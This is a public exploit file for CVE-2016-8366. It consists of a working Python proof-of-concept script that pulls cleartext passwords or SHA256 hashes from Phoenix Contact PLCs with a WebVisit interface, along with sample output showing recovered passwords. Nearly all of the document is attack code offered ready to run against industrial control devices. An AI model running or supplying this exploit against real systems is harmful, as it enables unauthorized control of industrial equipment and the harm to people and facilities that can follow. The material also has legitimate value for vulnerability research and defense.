# Exploit Author: Deneut Tijl
# Vendor Homepage: www.phoenixcontact.com
# Software Link: https://www.phoenixcontact.com/online/portal/nl/?uri=pxc-oc-itemdetail:pid=2985725&library=nlnl&pcck=P-19-05-01&tab=5
# Version: WebVisit < 6.40.00
# CVE: CVE-2016-8366
 
# This script will perform retrieval of clear text credentials for a Phoenix Contact PLC with a WebVisit GUI, 
# password protected, application on it Tested on the Phoenix Contact ILC-390 PLC, but others are 
# surely equally vulnerable with WebVisit 6.40.00, the passwords are SHA256 hashes, which also will be retrieved
         
# Sample output:
# C:\Users\admin\Desktop>CVE-2016-8366.py
# Please enter an IP [192.168.1.200]:
# This is the password for userlevel 1: pw1
# This is the password for userlevel 2: SuperPass2
# This is the password for userlevel 3: Extreme2TheMax3
# This is the password for userlevel 4: PowerPass4
# Press Enter to exit
 
# PoC
 
#! /usr/bin/env python
 
import urllib2, binascii
 
strIP = raw_input(&#039;Please enter an IP [192.168.1.200]: &#039;)
if strIP == &#039;&#039;: strIP = &#039;192.168.1.200&#039;
 
try:
    URLResponse = urllib2.urlopen(urllib2.Request(&#039;http://&#039; + strIP + &#039;/&#039;))
except urllib2.HTTPError:
    print(&#039;#### Critical Error with IP &#039; + strIP + &#039;: no response&#039;)
    raw_input(&#039;Press Enter to exit&#039;)
    exit()
 
strMainTEQ = &#039;&#039;
for line in URLResponse.readlines():
    if &#039;MainTEQName&#039; in line:
        strMainTEQ = line.split(&#039;VALUE="&#039;)[1].split(&#039;"&#039;)[0]
 
if strMainTEQ == &#039;&#039;:
    print(&#039;#### Error, no \&#039;MainTEQ\&#039; found on the main page&#039;)
    raw_input(&#039;Press Enter to exit&#039;)
    exit()
 
try:
    LoginTeqResponse = urllib2.urlopen(urllib2.Request(&#039;http://&#039; + strIP + &#039;/&#039; + strMainTEQ))
except urllib2.HTTPError:
    print(&#039;Critical Error with IP &#039; + strIP + &#039;: File \&#039;&#039; + strMainTEQ + &#039;\&#039; not found&#039;)
    raw_input(&#039;Press Enter to exit&#039;)
    exit()
strAlldata = &#039;&#039;
for line in LoginTeqResponse.readlines():
    strAlldata += binascii.hexlify(line)
 
## For vulnerable webvisit:
## Seems to be &#039;userLevel&#039; + x bytes + 1 + y bytes + &#039;password&#039;
## userLevel + &#039;0506030001&#039; + 31 + &#039;00030003010301068300&#039; + passlength + &#039;password&#039;
## For WebVisit > 6.40.00
## userLevel + &#039;0003000301030b06830040&#039; + &#039;SHA256&#039; (wich is 64 bytes)
 
arrData = strAlldata.split(&#039;757365724c6576656c0506030001&#039;) ## userLevel + &#039;0506030001&#039;
for item in arrData:
    if &#039;00030003010301068300&#039; in item:
        intUserlevel = int(binascii.unhexlify(item[:2]), 16) ## Turn str &#039;31&#039; into int 1
        strPassLength = item.split(&#039;00030003010301068300&#039;)[1][:2]
        strPassword = binascii.unhexlify(item.split(&#039;00030003010301068300&#039;)[1][2:2+(2*int(strPassLength,16))])
        print(&#039;This is the password for userlevel &#039; + str(intUserlevel) + &#039;: &#039; + strPassword)
    elif &#039;0003000301030b06830040&#039; in item:
        intUserlevel = int(binascii.unhexlify(item[:2]), 16)
        strHash = binascii.unhexlify(item.split(&#039;0003000301030b06830040&#039;)[1][:64*2])
        print(&#039;This is the hash for userlevel &#039; + str(intUserlevel) + &#039;: &#039; + strHash.lower())
raw_input(&#039;Press Enter to exit&#039;)

